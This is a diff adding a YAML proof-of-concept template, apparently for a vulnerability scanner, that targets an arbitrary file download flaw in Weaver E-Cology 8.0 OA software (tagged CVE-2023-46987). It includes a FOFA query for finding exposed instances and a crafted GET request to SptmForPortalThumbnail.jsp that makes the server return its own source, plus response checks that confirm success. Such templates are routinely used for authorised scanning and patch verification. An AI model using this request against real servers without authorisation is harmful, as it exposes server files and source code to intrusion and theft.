@@ -1,0 +1,23 @@
+id: poc-yaml-weaver-e-cology-8-sptmforportalthumbnail-anyfile-download
+info:
+  name: 泛微OA E-Cology 8.0 SptmForPortalThumbnail 任意文件下载漏洞
+  severity: high
+  tags:
+  - CVE-2023-46987
+  - 两高一弱
+  finger: e-cology
+  fofa: app="泛微-OA（e-cology）"
+requests:
+- method: GET
+  path: /portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp
+  expression: 'status_code == 200 &&
+
+    contains(body,"<%@ page import=\"java.io.*\" %>") &&
+
+    contains(body,"weaver.general.BaseBean") &&
+
+    contains(headers,"image/png")
+
+    '
+variables: {}
+transport: http
